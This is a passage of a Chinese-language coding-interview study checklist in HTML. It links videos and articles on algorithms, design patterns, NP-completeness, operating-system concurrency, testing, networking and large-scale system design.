(starts at 59:18)（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=0EzHjQ_SOeU&amp;index=11&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">Simonson: 动态规划 I - 课程 11（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=v1qiRwuJU7g&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=12">Simonson: 动态规划 II - 课程 12（视频）</a></li><li>[ ] 单独的 DP 问题 (每一个视频都很短)：<a href="https://www.youtube.com/playlist?list=PLrmLmBdmIlpsHaNTPP_jHHDx_os9ItYXr">动态规划（视频）</a></li></ul></li><li>[ ] 耶鲁课程笔记:<ul><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#dynamicProgramming">动态规划</a></li></ul></li><li>[ ] Coursera 课程:<ul><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/80RrW/the-rna-secondary-structure-problem">RNA 二级结构问题（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/PSonq/a-dynamic-programming-algorithm">动态规划算法（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/oUEK2/illustrating-the-dp-algorithm">DP 算法描述（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/nfK2r/running-time-of-the-dp-algorithm">DP 算法的运行时间（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/M999a/dp-vs-recursive-implementation">DP vs 递归实现（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/UZ7o6/global-pairwise-sequence-alignment">全局成对序列排列（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithmic-thinking-2/lecture/WnNau/local-pairwise-sequence-alignment">本地成对序列排列（视频）</a></li></ul></li></ul></li><li><h3><span id="mian-xiang-dui-xiang-bian-cheng">面向对象编程</span></h3><ul><li>可选：<a href="https://www.youtube.com/watch?v=OkC7HKtiZC0&amp;list=PLGLfVvz_LVvQ5G-LdJ8RLqe-ndo7QITYc">UML 2.0系列（视频）</a></li><li>SOLID 面向对象编程原则：<a href="https://www.youtube.com/playlist?list=PL4CE9F710017EA77A">SOLID 原则（视频）</a></li></ul></li><li><h3><span id="she-ji-mo-shi">设计模式</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=3cmzqZzwNDM&amp;list=PLGLfVvz_LVvQ5G-LdJ8RLqe-ndo7QITYc&amp;index=3">UML 统一建模语言概览 (视频)</a></li><li>[ ] 主要有如下的设计模式:<ul><li>[ ] 策略模式（strategy）</li><li>[ ] 单例模式（singleton）</li><li>[ ] 适配器模式（adapter）</li><li>[ ] 原型模式（prototype）</li><li>[ ] 装饰器模式（decorator）</li><li>[ ] 访问者模式（visitor）</li><li>[ ] 工厂模式，抽象工厂模式（factory, abstract factory）</li><li>[ ] 外观模式（facade）</li><li>[ ] 观察者模式（observer）</li><li>[ ] 代理模式（proxy）</li><li>[ ] 委托模式（delegate）</li><li>[ ] 命令模式（command）</li><li>[ ] 状态模式（state）</li><li>[ ] 备忘录模式（memento）</li><li>[ ] 迭代器模式（iterator）</li><li>[ ] 组合模式（composite）</li><li>[ ] 享元模式（flyweight）</li></ul></li><li>[ ] <a href="https://youtu.be/LAP2A80Ajrg?list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO&amp;t=3344">第六章 (第 1 部分 ) - 设计模式 (视频)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=U8-PGsjvZc4&amp;index=12&amp;list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO">第六章 (第 2 部分 ) - Abstraction-Occurrence, General Hierarchy, Player-Role, Singleton, Observer, Delegation (视频)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=7sduBHuex4c&amp;index=13&amp;list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO">第六章 (第 3 部分 ) - Adapter, Facade, Immutable, Read-Only Interface, Proxy（视频）</a></li><li>[ ] <a href="https://www.youtube.com/playlist?list=PLF206E906175C7E07">系列视频（27个）</a></li><li>[ ] <a href="https://www.amazon.com/Head-First-Design-Patterns-Freeman/dp/0596007124">Head First 设计模型</a><ul><li>尽管《设计模式：可复用面向对象软件的基础》才是这方面的经典，但是我还是认为Head First对于新手更加友好。</li></ul></li><li>[ ] <a href="https://sourcemaking.com/design-patterns-and-tips">实际操作：设计模式和对入门开发者的建议</a></li><li>[ ] <a href="https://github.com/kamranahmedse/design-patterns-for-humans#structural-design-patterns">Design patterns for humans</a></li></ul></li><li><h3><span id="zu-he-combinatorics-n-zhong-xuan-k-ge-amp-gai-lu-probability">组合（Combinatorics） (n 中选 k 个) &amp; 概率（Probability）</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=8RRo6Ti9d0U">数据技巧: 如何找出阶乘、排列和组合(选择)（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=sZkAAk9Wwa4">来点学校的东西: 概率（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=dNaJg-mLobQ">来点学校的东西: 概率和马尔可夫链（视频）</a></li><li>[ ] 可汗学院:<ul><li>课程设置:<ul><li>[ ] <a href="https://www.khanacademy.org/math/probability/probability-and-combinatorics-topic">概率理论基础</a></li></ul></li><li>只有视频 - 41 (每一个都短小精悍):<ul><li>[ ] <a href="https://www.youtube.com/watch?v=uzkc-qNVoOk&amp;list=PLC58778F28211FA19">概率解释（视频）</a></li></ul></li></ul></li></ul></li><li><h3><span id="np-np-wan-quan-he-jin-si-suan-fa">NP, NP-完全和近似算法</span></h3><ul><li>知道最经典的一些 NP 完全问题，比如旅行商问题和背包问题，而且能在面试官试图忽悠你的时候识别出他们。</li><li>知道 NP 完全是什么意思.</li><li>[ ] <a href="https://www.youtube.com/watch?v=moPtwq_cVH8&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=23">计算复杂度（视频）</a></li><li>[ ] Simonson:<ul><li>[ ] <a href="https://youtu.be/qcGnJ47Smlo?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=2939">贪心算法. II &amp; 介绍 NP-完全性（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=e0tGC6ZQdQE&amp;index=16&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">NP-完全性 II &amp; 归约（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=fCX1BGT3wjE&amp;index=17&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">NP-完全性 III（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=NKLDp3Rch3M&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=18">NP-完全性 IV（视频）</a></li></ul></li><li>[ ] Skiena:<ul><li>[ ] <a href="https://youtu.be/KiK5TVgXbFg?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=1508">CSE373 2012 - 课程 23 - 介绍 NP-完全性 IV（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=27Al52X3hd4&amp;index=24&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - 课程 24 - NP-完全性证明（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=xCPH4gwIIXM&amp;index=25&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - 课程 25 - NP-完全性挑战（视频）</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=eHZifpgyH_4&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=22">复杂度: P, NP, NP-完全性, 规约（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=MEz1J9wY2iM&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=24">复杂度: 近视算法 Algorithms（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=4q-jmGrmxKs&amp;index=25&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">复杂度: 固定参数算法（视频）</a></li><li>Peter Norvik 讨论旅行商问题的近似最优解:<ul><li><a href="http://nbviewer.jupyter.org/url/norvig.com/ipython/TSP.ipynb">Jupyter 笔记本</a></li></ul></li><li>《算法导论》（CLRS）的第 1048 - 1140 页。</li></ul></li><li><h3><span id="huan-cun-cache">缓存（Cache）</span></h3><ul><li>[ ] LRU 缓存:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=R5ON3iwx78M">LRU 的魔力 (100 Days of Google Dev)（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=bq6N7Ym81iI">实现 LRU（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=8-FZRAjR7qU">LeetCode - 146 LRU Cache (C++)（视频）</a></li></ul></li><li>[ ] CPU 缓存:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=vjYF_fAZI5E&amp;list=PLrRW1w6CGAcXbMtDFj205vALOGmiRc82-&amp;index=24">MIT 6.004 L15: 存储体系（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ajgC3-pyGlk&amp;index=25&amp;list=PLrRW1w6CGAcXbMtDFj205vALOGmiRc82-">MIT 6.004 L16: 缓存的问题（视频）</a></li></ul></li></ul></li><li><h3><span id="jin-cheng-processe-he-xian-cheng-thread">进程（Processe）和线程（Thread）</span></h3><ul><li>[ ] 计算机科学 162 - 操作系统 (25 个视频):<ul><li>视频 1-11 是关于进程和线程</li><li><a href="https://archive.org/details/ucberkeley-webcast-PL-XXv-cvA_iBDyz-ba4yDskqMDY6A1w_c">操作系统和系统编程（视频）</a></li></ul></li><li><a href="https://www.quora.com/What-is-the-difference-between-a-process-and-a-thread">进程和线程的区别是什么?</a></li><li>涵盖了:<ul><li>进程、线程、协程<ul><li>进程和线程的区别</li><li>进程</li><li>线程</li><li>锁</li><li>互斥</li><li>信号量</li><li>监控</li><li>他们是如何工作的</li><li>死锁</li><li>活锁</li></ul></li><li>CPU 活动, 中断, 上下文切换</li><li>现代多核处理器的并发式结构</li><li><a href="https://www.youtube.com/watch?v=LKe7xK0bF7o&amp;list=PLCiOXwirraUCBE9i_ukL8_Kfg6XNv7Se8&amp;index=2">分页（paging），分段（segmentation）和虚拟内存（视频）</a></li><li><a href="https://www.youtube.com/watch?v=uFKi2-J-6II&amp;list=PLCiOXwirraUCBE9i_ukL8_Kfg6XNv7Se8&amp;index=3">中断（视频）</a></li><li>进程资源需要（内存：代码、静态存储器、栈、堆、文件描述符、I/O）</li><li>线程资源需要（在同一个进程内和其他线程共享以上（除了栈）的资源，但是每个线程都有独立的程序计数器、栈计数器、寄存器和栈）</li><li>Fork 操作是真正的写时复制（只读），直到新的进程写到内存中，才会生成一份新的拷贝。</li><li>上下文切换<ul><li>操作系统和底层硬件是如何初始化上下文切换的？</li></ul></li></ul></li><li>[ ] <a href="https://www.youtube.com/playlist?list=PL5jc9xFGsL8E12so1wlMS0r0hTQoJL74M">C++ 的线程 (系列 - 10 个视频)</a></li><li>[ ] Python 的并发 (视频):<ul><li>[ ] <a href="https://www.youtube.com/playlist?list=PL1H1sBF1VAKVMONJWJkmUh6_p8g4F2oy1">线程系列</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Bs7vPNbB9JM">Python 线程</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Obt-vMVdM8s">理解 Python 的 GIL (2010)</a><ul><li><a href="http://www.dabeaz.com/GIL">参考</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=MCs5OvhV9S4">David Beazley - Python 协程 - PyCon 2015</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ZzfHjytDceU">Keynote David Beazley - 兴趣主题 (Python 异步 I/O)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=0zaPs8OtyKY">Python 中的互斥</a></li></ul></li></ul></li><li><h3><span id="ce-shi">测试</span></h3><ul><li>涵盖了:<ul><li>单元测试是如何工作的</li><li>什么是模拟对象</li><li>什么是集成测试</li><li>什么是依赖注入</li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=SAhJf36_u5U">James Bach 讲敏捷软件测试（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ILkT_HV9DVU">James Bach 软件测试公开课（视频）</a></li><li>[ ] <a href="https://vimeo.com/83960706">Steve Freeman - 测试驱动的开发（视频）</a><ul><li><a href="http://gotocon.com/dl/goto-berlin-2013/slides/SteveFreeman_TestDrivenDevelopmentThatsNotWhatWeMeant.pdf">slides</a></li></ul></li><li>[ ] <a href="http://www.obeythetestinggoat.com/pages/book.html#toc">Python：测试驱动的 Web 开发</a></li><li>[ ] 依赖注入:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=IKD2-MAkXyQ">视频</a></li><li>[ ] <a href="http://jasonpolites.github.io/tao-of-testing/ch3-1.1.html">测试之道</a></li></ul></li><li>[ ] <a href="http://jasonpolites.github.io/tao-of-testing/ch4-1.1.html">如何编写测试</a></li></ul></li><li><h3><span id="diao-du">调度</span></h3><ul><li>在操作系统中是如何运作的</li><li>在操作系统部分的视频里有很多资料</li></ul></li><li><h3><span id="zi-fu-chuan-sou-suo-he-cao-zuo">字符串搜索和操作</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/TH18W/suffix-arrays">Sedgewick──后缀数组（Suffix Arrays）（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/home/week/4">Sedgewick──子字符串搜寻（视频）</a><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/n3ZpG/introduction-to-substring-search">1. 子字符串搜寻导论</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/2Kn5i/brute-force-substring-search">2. 子字符串搜寻──暴力法</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/TAtDr/knuth-morris-pratt">3. KMP算法</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/CYxOT/boyer-moore">4. Boyer-Moore算法</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/3KiqT/rabin-karp">5. Rabin-Karp算法</a></li></ul></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/tAfHI/search-pattern-in-text">文本的搜索模式（视频）</a></li></ul></li></ul><p>如果你需要有关此主题的更多详细信息，请参阅“<a href="#%E4%B8%80%E4%BA%9B%E4%B8%BB%E9%A2%98%E7%9A%84%E9%A2%9D%E5%A4%96%E5%86%85%E5%AE%B9">一些主题的额外内容</a>”中的“字符串匹配”部分。</p><ul><li><h3><span id="zi-dian-shu-tries">字典树（Tries）</span></h3><ul><li>需要注意的是，字典树各式各样。有些有前缀，而有些则没有。有些使用字符串而不使用比特位来追踪路径。</li><li>阅读代码，但不实现。</li><li><a href="https://www.coursera.org/learn/algorithms-part2/home/week/4">Sedgewick──字典树（3个视频）</a><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/CPVdr/r-way-tries">1. R Way字典树</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/yQM8K/ternary-search-tries">2. 三元搜索树</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/jwNmV/character-based-operations">3. 基于字符串的操作</a></li></ul></li><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#Tries">数据结构笔记及编程技术</a></li><li>[ ] 短课程视频：<ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/08Xyf/core-introduction-to-tries">对字典树的介绍（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/PvlZW/core-performance-of-tries">字典树的性能（视频）</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/DFvd3/core-implementing-a-trie">实现一棵字典树（视频）</a></li></ul></li><li>[ ] <a href="https://www.toptal.com/java/the-trie-a-neglected-data-structure">字典树：一个被忽略的数据结构</a></li><li>[ ] <a href="https://www.topcoder.com/community/data-science/data-science-tutorials/using-tries/">TopCoder —— 使用字典树</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=TJ8SkcUSdbU">标准教程（现实中的用例）（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=NinWEPPrkDQ&amp;index=16&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf">MIT，高阶数据结构，字符串（视频中间有点困难）（视频）</a></li></ul></li><li><h3><span id="fu-dian-shu">浮点数</span></h3><ul><li>[ ] 简单8位：<a href="https://www.youtube.com/watch?v=ji3SfClm8TU">浮点数的表示形式-1（视频──计算中存在错误，请参见视频说明）</a></li><li>[ ] 32位：<a href="https://www.youtube.com/watch?v=50ZYcZebIec">IEEE754 32位浮点二进制（视频）</a></li></ul></li><li><h3><span id="unicode">Unicode</span></h3><ul><li>[ ] <a href="http://www.joelonsoftware.com/articles/Unicode.html">每一个软件开发者的绝对最低限度，必须要知道的关于 Unicode 和字符集知识</a></li><li>[ ] <a href="http://kunststube.net/encoding/">关于处理文本需要的编码和字符集，每个程序员绝对需要知道的知识</a></li></ul></li><li><h3><span id="zi-jie-xu-endianness">字节序（Endianness）</span></h3><ul><li><a href="https://web.archive.org/web/20180107141940/http://www.cs.umd.edu:80/class/sum2003/cmsc311/Notes/Data/endian.html">大/小端序</a></li><li><a href="https://www.youtube.com/watch?v=JrNF0KRAlyo">大端序 Vs 小端序（视频）</a></li><li><a href="https://www.youtube.com/watch?v=oBSuXP-1Tc0">由里入内的大端序与小端序（视频）</a><ul><li>对于内核开发非常具有技术性，如果大多数的内容听不懂也没关系。</li><li>前半部就已经足够了。</li></ul></li></ul></li><li><h3><span id="wang-luo-shi-pin">网络（视频）</span></h3><ul><li><strong>如果你具有网络经验或想成为可靠性工程师或运维工程师，期待你的问题</strong></li><li>知道这些有益无害，多多益善!</li><li>[ ] <a href="https://www.khanacademy.org/computing/computer-science/computers-and-internet-code-org">可汗学院</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Vdc8TCESIg8">UDP 和 TCP：网络传输协议中的数据压缩（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=e5DEVa9eSN0">TCP/IP 和 OSI 模型解释！（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=nomyRJehhnM">互联网上的数据包传输。网络和 TCP/IP 教程。（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=WGJrLqtX7As">HTTP（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=S2iBR2ZlZf0">SSL 和 HTTPS（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Rp3iZUvXWlM">SSL/TLS（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=E9FxNzv1Tr8">HTTP 2.0（视频）</a></li><li>[ ] <a href="https://www.youtube.com/playlist?list=PLEbnTDJUr_IegfoqO4iPnPYQui46QqT0j">视频系列（21个视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=t5xYI0jzOf4">子网络解密 - 第五部分 经典内部域名指向 CIDR 标记（视频）</a></li><li>[ ] 套接字（Sockets）：<ul><li><a href="https://www.youtube.com/watch?v=6G_W54zuadg&amp;t=6s">Java──套接字──介绍（视频）</a></li><li><a href="https://www.youtube.com/watch?v=G75vN2mnJeQ">套接字编程（视频）</a></li></ul></li></ul></li></ul><h2><span id="xi-tong-she-ji-ke-shen-suo-xing-shu-ju-chu-li">系统设计、可伸缩性、数据处理</span></h2><p><strong>如果你已经拥有了4年以上的编程经验，那你可以来看看有关系统设计的问题</strong></p><ul><li>系统设计以及可伸缩性，要把软硬件的伸缩性设计的足够好有很多的东西要考虑，所以这是个包含非常多内容和资源的大主题。要花费相当多的时间在这个主题上。</li><li>考量：<ul><li>伸缩性<ul><li>把大数据集提取为单一值</li><li>大数据集转换</li><li>处理大量的数据集</li></ul></li><li>系统<ul><li>功能集</li><li>接口</li><li>类层次结构</li><li>在特定的约束下设计系统</li><li>轻量和健壮性</li><li>权衡和折衷</li><li>性能分析和优化</li></ul></li></ul></li><li>[ ] <strong>从这里开始</strong>：<a href="https://github.com/donnemartin/system-design-primer">系统设计入门</a></li><li>[ ] <a href="http://www.hiredintech.com/system-design/">HiredInTech：系统设计</a></li><li>[ ] <a href="https://www.quora.comHow-do-I-prepare-to-answer-design-questions-in-a-technical-interview?redirected_qid=1500023">该如何为技术面试里设计方面的问题做准备?</a></li><li>[ ] <a href="http://blog.gainlo.co/index.php/2015/10/228-things-you-need-to-know-before-system-design-interviews/">在系统设计面试前必须知道的 8 件事</a></li><li>[ ] <a href="http://www.hiredintech.com/algorithm-design/">算法设计</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=UrYLYV7WSHM">数据库范式 - 1NF, 2NF, 3NF and 4NF（视频）</a></li><li>[ ] <a href="https://github.com/checkcheckzz/system-design-interview">系统设计面试</a> - 这一部分有很多的资源浏览一下我放在下面的文章和例子。</li><li>[ ] <a href="http://www.palantir.com/2011/10how-to-rock-a-systems-design-interview/">如何在系统设计面试中脱颖而出</a></li><li>[ ] <a href="http://everythingisdata.wordpress.com/2009/10/17numbers-everyone-should-know/">每个人都该知道的一些数字</a></li><li>[ ] <a href="http://blog.tsunanet.net/2010/11how-long-does-it-take-to-make-context.html">上下文切换操作会耗费多少时间?</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=srOgpXECblk">跨数据中心的事务（视频）</a></li><li>[ ] <a href="http://ksat.me/a-plain-english-introduction-to-cap-theorem/">简明 CAP 理论介绍</a></li><li>[ ] 共识算法：<ul><li>[ ] Paxos：<a href="https://www.youtube.com/watch?v=s8JqcZtvnsM">Paxos协议──Computerphile（视频）</a></li><li>[ ] Raft: <a href="https://www.youtube.com/watch?v=P9Ydif5_qvE">Raft 分布式共识算法简介（视频）</a><ul><li>[ ] <a href="https://raft.github.io/">易于阅读的论文</a></li><li>[ ] [信息图]</li></ul></li></ul></li><li>[ ] <a href="http://www.tom-e-white.com/2007/11/consistent-hashing.html">一致性哈希</a></li><li>[ ] <a href="http://horicky.blogspot.com/2009/11/nosql-patterns.html">NoSQL 模式</a></li><li>[ ] 可伸缩性:<ul><li>你不需要知道所有这些。只需挑选一些你感兴趣的东西即可。</li><li>[ ] <a href="https://www.youtube.com/watch?v=-W9F__D3oY4">很棒的概述（视频）</a></li><li>[ ] 简短系列:<ul><li><a href="http://www.lecloud.net/post/7295452622/scalability-for-dummies-part-1-clones">克隆</a></li><li><a href="http://www.lecloud.net/post/7994751381/scalability-for-dummies-part-2-database">数据库</a></li><li><a href="http://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache">缓存</a></li><li><a href="http://www.lecloud.net/post/9699762917/scalability-for-dummies-part-4-asynchronism">异步</a></li></ul></li><li>[ ] <a href="http://www.aosabook.org/en/distsys.html">可伸缩的 Web 架构和分布式系统</a></li><li>[ ] <a href="https://pages.cs.wisc.edu/~zuyu/files/fallacies.pdf">错误的分布式系统解释</a></li><li>[ ] <a href="http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html">实用编程技术</a><ul><li><a href="http://horicky.blogspot.com/2010/07/google-pregel-graph-processing.html">extra: Google Pregel 图形处理</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=modXC5IWTJI">Jeff Dean - 在 Goolge 构建软件系统（视频）</a></li><li>[ ] <a href="http://lethain.com/introduction-to-architecting-systems-for-scale/">可伸缩系统架构设计介绍</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=9nWyWwY2Onc">使用 App Engine 和云存储扩展面向全球用户的手机游戏架构实践（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=H4vMcD7zKM0">How Google Does Planet-Scale Engineering for Planet-Scale Infra（视频）</a></li><li>[ ] <a href="https://www.topcoder.com/community/data-science/data-science-tutorials/the-importance-of-algorithms/">算法的重要性</a></li><li>[ ] <a href="http://highscalability.com/blog/2009/8/6/an-unorthodox-approach-to-database-design-the-coming-of-the.html">分片（Sharding）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=oodS71YtkGU">Facebook 系统规模扩展实践 (2012), “为 10 亿用户构建”（视频）</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=p0jGmgIrf_M&amp;list=PLRXxvay_m8gqVlExPC5DG3TGWJTaBgqSA&amp;index=4">Long Game 工程实践 - Astrid Atkinson Keynote（视频）</a></li><li>[ ] <a href="http://highscalability.com/blog/2012/3/26/7-years-of-youtube-scalability-lessons-in-30-minutes.html">30 分钟看完 YouTuBe 7 年系统扩展经验</a><ul><li><a href="https://www.youtube.com/watch?v=G-lGCC4KKok">视频</a></li></ul></li><li>[ ] <a href="http://highscalability.com/blog/2016/8/15/how-paypal-scaled-to-billions-of-transactions-daily-using-ju.html">PayPal 如何用 8 台虚拟机扛住 10 亿日交易量系统</a></li><li>[ ] <a href="https://blog.clevertap.com/how-to-remove-duplicates-in-large-datasets/">如何对大数据集去重</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=3vV4YiqKm1o">Etsy 的扩展和工程文化探究 Jon Cowie（视频）</a></li><li>[ ] <a href="http://thenewstack.io/led-amazon-microservices-architecture/">是什么造就了 Amazon 自己的微服务架构</a></li><li>[ ] <a href="https://eng.uber.com/trip-data-squeeze/">压缩还是不压缩，是 Uber 面临的问题</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/3/3/asyncio-tarantool-queue-get-in-the-queue.html">异步 I/O Tarantool 队列</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/25/when-should-approximate-query-processing-be-used.html">什么时候应该用近似查询处理?</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/23/googles-transition-from-single-datacenter-to-failover-to-a-n.html">Google 从单数据中心到故障转移, 到本地多宿主架构的演变</a></li><li>[ ] <a href="http://highscalability.com/blog/2012/9/24/google-spanners-most-surprising-revelation-nosql-is-out-and.html">Spanner</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/15/egnyte-architecture-lessons-learned-in-building-and-scaling.html">Egnyte: 构建和扩展 PB 级分布式系统架构的经验教训</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/7/6/machine-learning-driven-programming-a-new-programming-for-a.html">机器学习驱动的编程: 新世界的新编程方式</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/6/15/the-image-optimization-technology-that-serves-millions-of-re.html">日服务数百万请求的图像优化技术</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/2/1/a-patreon-architecture-short.html">Patreon 架构</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/27/tinder-how-does-one-of-the-largest-recommendation-engines-de.html">Tinder: 推荐引擎是如何决定下一个你将会看到谁的?</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html">现代缓存设计</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/13/live-video-streaming-at-facebook-scale.html">Facebook 实时视频流扩展</a></li><li>[ ] <a href="http://highscalability.com/blog/2016/1/11/a-beginners-guide-to-scaling-to-11-million-users-on-amazons.html">在 Amazon AWS 上把服务扩展到 1100 万量级的新手教程</a></li><li>[ ] <a href="http://highscalability.com/blog/2015/12/16/how-does-the-use-of-docker-effect-latency.html">对延时敏感的应用是否应该使用 Docker?</a></li><li>[ ] <a href="http://highscalability.com/blog/2015/11/9/a-360-degree-view-of-the-entire-netflix-stack.html">360 度解读 Netflix 技术栈</a></li><li>[ ] <a href="http://highscalability.com/latency-everywhere-and-it-costs-you-sales-how-crush-it">延迟无处不在 - 如何搞定它？</a></li><li>[ ] <a href="http://martinfowler.com/articles/serverless.html">无服务器架构</a></li><li>[ ] <a href="http://instagram-engineering.tumblr.com/post/13649370142/what-powers-instagram-hundreds-of-instances">是什么驱动着 Instagram: 上百个实例、几十种技术</a></li><li>[ ] <a href="http://highscalability.com/blog/2012/7/16/cinchcast-architecture-producing-1500-hours-of-audio-every-d.html">Cinchcast 架构 - 每天处理 1500 小时的音频</a></li><li>[ ] <a href="http://highscalability.com/blog/2010/3/16/justintvs-live-video-broadcasting-architecture.html">Justin.Tv 实时视频播放架构</a></li><li>[ ] <a href="http://highscalability.com/blog/2010/9/21/playfishs-social-gaming-architecture-50-million-monthly-user.html">Playfish’s 社交游戏架构 - 每月五千万用户增长</a></li><li>[ ] <a href="http://highscalability.com/blog/2011/6/27/tripadvisor-architecture-40m-visitors-200m-dynamic-page-view.html">猫途鹰架构 - 40 万访客, 200 万动态页面访问, 30TB 数据</a></li><li>[ ] <a href="http://highscalability.com/plentyoffish-architecture">PlentyOfFish 架构</a></li><li>[ ] <a href="http://highscalability.com/blog/2013/9/23/salesforce-architecture-how-they-handle-13-billion-transacti.html">Salesforce 架构 - 如何扛住 13 亿日交易量</a></li><li>[ ] <a href="http://highscalability.com/blog/2013/11/4/espns-architecture-at-scale-operating-at-100000-duh-nuh-nuhs.html">ESPN’s 架构扩展</a></li><li>[ ] 下面“消息传递，序列化和队列系统”部分的内容会提到什么样的技术能把各种服务整合到一起</li><li>[ ] Twitter:<ul><li><a href="https://www.youtube.com/watch?v=5cKTP36HVgI">O’Reilly MySQL CE 2011: Jeremy Cole, “Big and Small Data at @Twitter”（视频）</a></li><li><a href="https://www.infoq.com/presentations/Twitter-Timeline-Scalability">时间线的扩展</a></li></ul></li><li>更多内容可以查看<a 